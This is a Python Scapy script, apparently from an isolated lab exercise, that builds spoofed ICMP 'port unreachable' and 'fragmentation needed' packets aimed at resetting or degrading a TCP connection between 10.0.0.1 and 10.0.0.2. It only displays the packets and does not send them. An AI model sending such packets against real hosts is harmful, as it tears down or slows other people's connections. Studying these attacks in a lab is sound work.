#!/usr/bin/env python3
"""
Phase 3: Build and inspect ICMP attack packets
Run this AFTER reading CLIENT_PORT and SEQ_NUM from a tcpdump capture.

Usage:
    sudo ip netns exec attacker python3 attacks/build_packets.py
"""

from scapy.all import IP, ICMP, TCP, raw

# ── Read these from tcpdump of a live TCP connection ─────────────
CLIENT_IP   = "10.0.0.1"
SERVER_IP   = "10.0.0.2"
CLIENT_PORT = None   # fill after Phase 4 setup
SERVER_PORT = 9999
SEQ_NUM     = None   # fill after Phase 4 setup

def build_reset_packet(client_port, seq_num):
    """
    ICMP Type 3, Code 3 — Port Unreachable
    RFC 1122: this is a hard error → TCP should abort the connection
    
    Packet structure (per RFC 792):
    [ Outer IP  ] src=CLIENT_IP (spoofed), dst=SERVER_IP
    [ ICMP      ] type=3, code=3
    [ Inner IP  ] original IP header of the TCP connection
    [ Inner TCP ] first 8 bytes: sport(2) + dport(2) + seq(4)
    """
    inner_tcp = TCP(
        sport = client_port,
        dport = SERVER_PORT,
        seq   = seq_num,
    )
    inner_ip = IP(src=CLIENT_IP, dst=SERVER_IP, proto=6)
    icmp     = ICMP(type=3, code=3)
    outer_ip = IP(src=CLIENT_IP, dst=SERVER_IP)

    return outer_ip / icmp / inner_ip / inner_tcp

def build_pmtu_packet(client_port, seq_num, advertised_mtu=576):
    """
    ICMP Type 3, Code 4 — Fragmentation Needed (DF Set)
    RFC 1191: unused field low 16 bits = next-hop MTU
    
    Start with 576 (conservative), then try smaller values.
    Observe actual kernel PMTU with: ip route get 10.0.0.2
    Do NOT assume any MTU value will be blindly accepted.
    """
    inner_tcp = TCP(sport=client_port, dport=SERVER_PORT, seq=seq_num)
    inner_ip  = IP(src=CLIENT_IP, dst=SERVER_IP, proto=6)
    icmp      = ICMP(type=3, code=4)
    icmp.unused = advertised_mtu   # next-hop MTU in low 16 bits (RFC 1191)
    outer_ip  = IP(src=CLIENT_IP, dst=SERVER_IP)

    return outer_ip / icmp / inner_ip / inner_tcp

if __name__ == "__main__":
    # Use placeholder values just to inspect structure
    test_port = 54321
    test_seq  = 1000000

    print("=" * 60)
    print("RESET PACKET — Type 3, Code 3")
    print("=" * 60)
    r = build_reset_packet(test_port, test_seq)
    r.show2()   # show2() displays computed checksums
    print("Raw bytes:", raw(r).hex())

    print()
    print("=" * 60)
    print("PMTU REDUCTION PACKET — Type 3, Code 4, MTU=576")
    print("=" * 60)
    p = build_pmtu_packet(test_port, test_seq, advertised_mtu=576)
    p.show2()
    print("Raw bytes:", raw(p).hex())
